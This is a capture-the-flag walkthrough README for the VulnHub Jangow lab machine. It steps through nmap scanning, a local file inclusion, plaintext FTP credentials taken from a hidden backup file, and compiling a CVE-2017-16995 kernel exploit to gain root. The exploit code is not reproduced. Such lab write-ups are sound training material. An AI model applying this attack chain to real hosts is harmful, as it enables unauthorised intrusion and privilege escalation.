# JANGOW-1.0.1-Walkthrough-Vulnhub
Walkthrough and exploitation steps for the Jangow CTF machine from VulnHub.
## 🕵️‍♀️ VulnHub CTF — Jangow Walkthrough

This is a walkthrough for the **Jangow** machine from VulnHub. It covers the entire exploitation process, including enumeration, LFI, credential discovery, privilege escalation, and finally rooting the machine.

---

### 💾 Setup

- Import the `.ova` file into VirtualBox.
- Run the machine.
- Use `netdiscover` to identify its IP:

```bash
netdiscover -i eth0
```

I discovered the machine at `192.168.1.122`.

---

### 🔎 Port Scanning with Nmap

Initial port scan:

```bash
nmap 192.168.1.122
```

Open ports:
- **80 (HTTP)**
- **21 (FTP)**

Detailed scan:

```bash
nmap -p 80,21 -Pn -n -sC -sV -oN nmap_scan.txt 192.168.1.122
```

**Flags used:**
- `-p`: specific ports
- `-Pn`: skip host discovery
- `-n`: skip DNS resolution
- `-sC`: run default scripts
- `-sV`: detect service versions
- `-oN`: save output to file

---

### 🌐 Web Enumeration

Visiting `http://192.168.1.122` reveals a website with a **"Buscar"** tab, which redirects to:

```
https://pwnlab.me/redirect?to=aHR0cDovLzE5Mi4xNjguNTYuMTE4L3NpdGUvYnVzcXVlLnBocD9idXNjYXI9
```

This link appears vulnerable to **Local File Inclusion (LFI)**.

By manipulating the URL, we can inspect the file structure and extract sensitive files.

---

### 🔐 Credential Discovery

Exploring the web root:

```bash
pwd
# /var/www/html/site

ls -all
```

Found a hidden file: `.backup`  
Contents of `.backup` reveal **MySQL credentials**.

Also, since FTP port is open, I tested those credentials on the FTP service.

---

### 📂 FTP Access & File Upload

Login to FTP using:

```bash
ftp 192.168.1.122
```

Credentials:
```
Username: jangow01
Password: abygurl69
```

Change to the user's home directory:

```ftp
cd /home/jangow01
```

Download the user flag:

```ftp
get user.txt
```

---

### 🚩 Privilege Escalation

Check the kernel version:

```bash
uname -a
# Linux jangow01 4.4.0-31-generic
```

Search for privilege escalation exploits and found:  
**CVE-2017-16995**

Downloaded and saved the exploit as `jangow.c`.

Upload it via FTP:

```ftp
put jangow.c
```

---

### ⚙️ Compilation & Exploitation

On the Jangow machine:

```bash
gcc jangow.c -o jangow
chmod +x jangow
./jangow
```

Now you're root!

---

### 🏁 Root Flag

Check the user:

```bash
whoami
# root
```

Get the flag:

```bash
ls /root
cat /root/proof.txt
```

---

## ✅ Summary

- Gained access via **LFI**
- Extracted credentials via hidden file
- Used **FTP** to upload a privilege escalation exploit
- Compiled and executed exploit
- Gained **root access**

**Machine successfully rooted!** 🎉
